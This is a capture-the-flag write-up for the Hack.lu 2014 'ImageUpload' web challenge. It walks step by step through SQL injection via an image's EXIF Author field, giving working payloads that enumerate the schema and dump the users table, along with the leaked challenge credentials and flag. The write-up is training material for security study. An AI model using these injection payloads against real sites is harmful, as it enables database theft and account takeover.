## Hack.lu CTF 2014 - ImageUpload (web 200)
##### 21-23/10/2014 (48hr)
___

### Description: 
In the Wild Wild Web, there are really bad guys. The sheriff doesn't know them all. 
Therefore, he needs your help. Upload pictures of criminals to this site and help 
the sheriff to arrest them. 
You can make this Wild Wild Web much less wild!!! 

Pictures will be deleted on regular basis!

___

### Solution

The login form is safe (sanitizes SQL injection, and \xbf\x27 exploit not allowed). The 
uploaded image is modified and we displaying image embeds the uploaded image (see images
"agnes 2- despicable me.jpg" and 9abbcf8b9fbb5971a0474cbbda30942e.jpg). So we can not in-
ject PHP code in image, because the image structure is modified.

However when we upload an image we see 5 more fields except the image: Width, Height,
Author, Manufacturer, Model. This reveals that we have an SQL DB to store the images.
So when we upload the image the insert statement should be like this:
```
	INSERT INTO some_table 
	VALUES (image_name, width, height, author, manufacturer, model);
```

We see that width and height have a 0 value, while the other 3 columns are NULL. This
is information from image metadata, so we try to insert code in image metadata: On 
Windows: Select Image -> Right Click -> Properties -> Details -> Set Author to ispo,
and upload the image.

We see the string "ispo" in the author column. Bingo! Now let's try our SQL injection.
What if I insert the name: foo','bar','code')-- ? The query will be:
```
	INSERT INTO some_table 
	VALUES (image_name, 0, 0, foo', 'bar', 'code')--, NULL, NULL);
```

The result will be:
```
	Width	Height	Author	Manufacturer	Model
	0	0	foo	bar		code
```

Now let's try to extract information:	
```
	Author: ispo', (SELECT SCHEMA()), 'bbb')#

	Width	Height	Author	Manufacturer	Model
	0	0	foo	chal		bbb
```

Database name is 'chal'. Let's find the tables from all databases:	
```
	Author: ispo', (SELECT GROUP_CONCAT(table_name) 
			FROM information_schema.tables 
			 WHERE table_schema != 'mysql' AND 
			       table_schema != 'information_schema'), 'bbb')#
```
			 
The Author column will contain the tables: brute,pictures,users. We use GROUP_CONCAT, 
because the SELECT statement should return 1 row and not more. So we merge the rows 
into 1 row. The table we want is users. Let's find its columns:
```
	Author: ispo', (SELECT GROUP_CONCAT(column_name) 
			FROM information_schema.columns 
			WHERE table_schema='chal' AND table_name='users'), 'bbb')#

	Width	Height	Author			Manufacturer	Model
	0	0	id,name,password	chal		bbb
```
			
Nice there are 3 columns. Let's find the rows:
```
	Author: ispo', (SELECT COUNT(*) FROM users), 'bbb')# 
```

So there are 2 rows. Now we can extract all table information with one query:
```
	Author: ispo', (SELECT GROUP_CONCAT(id,',',name,',',password) 
			FROM users LIMIT 1 OFFSET 0), 'bbb')#
```
			
And we get the requested results (see imageUpload.PNG): 
```
	1,sheriff,AO7eikkOCucCFJOyyaaQ,2,deputy,testpw
```

So there are 2 accounts:
```
	sheriff:AO7eikkOCucCFJOyyaaQ
	deputy:testpw
```

We go to the login form, we login with sheriff's credentials, and we get the flag:
	You are sucessfully logged in.
	Flag: `flag{1_5h07_7h3_5h3r1ff}`

___
